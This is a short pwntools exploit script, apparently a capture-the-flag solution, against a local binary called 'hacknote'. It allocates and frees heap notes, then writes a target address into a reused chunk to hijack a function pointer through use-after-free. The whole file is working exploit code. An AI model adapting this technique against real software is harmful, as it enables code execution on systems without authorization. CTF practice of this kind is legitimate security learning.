from pwn import *
p = process("./hacknote")
context.log_level = 'debug'
gdb.attach(p)
def add_note(length, buf):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(length))
    p.recvuntil(":")
    p.sendline(buf)

def delete_note(pos):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(pos)



magic = 0x08048986
add_note("16","aaaa")
add_note("16","bbbb")
delete_note("0")
delete_note("1")
add_note("8",p32(magic))
p.interactive()
